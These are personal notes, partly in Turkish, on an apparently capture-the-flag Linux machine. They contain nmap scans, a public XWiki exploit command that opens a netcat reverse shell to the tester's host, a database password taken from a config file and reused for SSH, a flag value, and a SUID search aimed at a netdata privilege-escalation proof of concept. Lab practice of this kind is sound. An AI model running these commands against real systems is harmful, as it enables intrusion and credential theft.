
# Remote - Linux -Easy

# IP= `10.10.11.80`

--------------------------------------------------------------------------------------

# Enum
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set

| http-title: XWiki - Main - Intro

|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/

| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)

| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 

| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 

| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 

| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 

|_/xwiki/bin/logout/
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty(10.0.20)

9999/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 3.10.12)
|_http-server-header: SimpleHTTP/0.6 Python/3.10.12
|_http-title: Directory listing for /
| http-methods: 
|_  Supported Methods: GET HEAD
```

## ports : 22,80,8080,9999

--------------------------------------------------------------------------------------

# web 80

## http methods: GET HEAD POST `OPTIONS`



# web 8080

## Jetty 10.0.20
exp yok.

## XWiki Debian 15.10.8 -> CVE-2025-24893
> https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2025-24893.py


ohhh shell
```bash
python3 CVE-2025-24893.py -u http://$IP:8080 -c 'busybox nc 10.10.16.234 1401 -e sh'
```


## ?  Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
Potentially risky methods: PROPFIND LOCK UNLOCK

## robots.txt
http-robots.txt
bişi yıok

# web 9999
## Directory listing for /
??

--------------------------------------------------------------------------------------

# ınıtial access - xwiki


## active ports
```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41765         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      250610/python3      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      1063/java           
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      1063/java 
```

## logs
```
/var/log/xwiki/2025_11_11.jetty.log
/var/log/xwiki/2025_11_11.request.log
```

writeup ile password bulduk
## xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat hibernate.cfg.xml
```bash
   <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

--------------------------------------------------------------------------------------

# ssh - oliver

## cred: `oliver:theEd1t0rTeam99`

## user.txt : `2828b0e2930a87285fefe843cd1fa2e3`

## mysql credential
```
/etc/mysql/mysql.conf.d/mysqld.cnf
```
username:mysql

## shell file
```bash
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh
```

## netdata > https://github.com/AzureADTrent/CVE-2024-32019-POC
id deyince geliyor? araştır.
```bash
find / -type f -perm -u=s -exec ls -ldb {} \; 2>/dev/null
-rwsr-x--- 1 root netdata 965056 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
-rwsr-x--- 1 root netdata 1377624 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
-rwsr-x--- 1 root netdata 1144224 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```
zafiyetli




--------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------
